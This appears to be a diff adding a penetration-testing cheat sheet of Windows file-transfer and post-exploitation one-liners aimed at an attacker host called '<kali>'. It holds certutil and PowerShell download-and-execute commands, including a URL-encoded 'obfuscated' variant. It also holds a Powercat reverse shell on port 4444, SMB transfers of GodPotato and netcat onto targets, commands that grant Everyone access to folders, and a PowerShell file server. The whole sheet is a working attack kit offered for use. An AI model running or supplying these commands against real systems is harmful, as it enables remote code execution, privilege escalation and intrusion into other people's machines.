@@ -1,0 +1,18 @@
+scp-copy-to-target: scp -P <port> <filename1> <user>@<target>:/tmp/
+Download and execute payload via certutil: certutil.exe -f -urlcache -split http://<kali>:80/update.exe c:\windows\temp\update.exe && cmd.exe /c c:\windows\temp\update.exe
+Download and save (Powershell):iwr -uri http://<kali>/<filename1> -Outfile <filename1>
+Download and execute PowerShell reverse shell (Powercat): IEX (New-Object System.Net.Webclient).DownloadString("http://<kali>/powercat.ps1");powercat -c <kali> -p 4444 -e powershell
+Obfuscated download and execute .exe via PowerShell: IEX+(New-Object+System.Net.WebClient).DownloadFile("http%3a//<kali>/update.exe",+"$env%3atemp\update.exe")%3b+Start-Process+"$env%3atemp\update.exe"
+SMB File Transfer from target to kali (kali-machine): impacket-smbserver -smb2support share .
+SMB File Transfer from target to kali (kali-machine): impacket-smbserver share . -smb2support -username user1 -password Passw0rd!
+SMB File Transfer from target to kali (target-machine): net use \\<kali>\share /user:user1 Passw0rd!
+SMB File Transfer from target to kali (target-machine): copy <file> \\<kali>\share\
+SMB File Transfer from target to kali (target-machine): powershell.exe "copy //192.168.45.200/share/GodPotato-NET4.exe C:/Windows/Temp/GodPotato-NET4.exe"
+SMB File Transfer from target to kali (target-machine): powershell.exe "copy //192.168.45.200/share/nc64.exe C:/Windows/Temp/nc64.exe"
+SMB File Transfer from target to target via Powershell(target1): icacls $PWD /grant 'Everyone:(OI)(CI)RX' /T | Out-Null; New-SmbShare -Name 'MyShare' -Path $PWD -ReadAccess 'Everyone'
+SMB File Transfer from target to target via cmd.exe(target1): icacls "%cd%" /grant Everyone:(OI)(CI)RX /T && net share MyShare="%cd%" /GRANT:Everyone,READ
+SMB File Transfer from target to target via cmd.exe(target1): icacls ".\<filename>" /grant Everyone:R
+SMB File Transfer from target to target via cmd.exe(target2): net use Z: \\<target>\MyShare
+SMB File Transfer from target to target via cmd.exe(target2): copy Z:\prts64.exe C:\Users\Public\prts64.exe
+Grant “Everyone” Read & Execute rights on current directory: icacls "." /grant Everyone:RX
+http server from target machine (fragile): $folder=Get-Location; $port=<port>; $listener=New-Object System.Net.HttpListener; $listener.Prefixes.Add("http://*:$port/"); $listener.Start(); Write-Host "Serving $folder on port $port"; while($listener.IsListening){$ctx=$listener.GetContext(); $req=$ctx.Request; $res=$ctx.Response; $path=Join-Path $folder ($req.Url.LocalPath.TrimStart('/').Replace('/','\')); if(Test-Path $path){$bytes=[IO.File]::ReadAllBytes($path); $res.ContentType='application/octet-stream'; $res.ContentLength64=$bytes.Length; $res.OutputStream.Write($bytes,0,$bytes.Length)}else{$res.StatusCode=404}; $res.OutputStream.Close()}
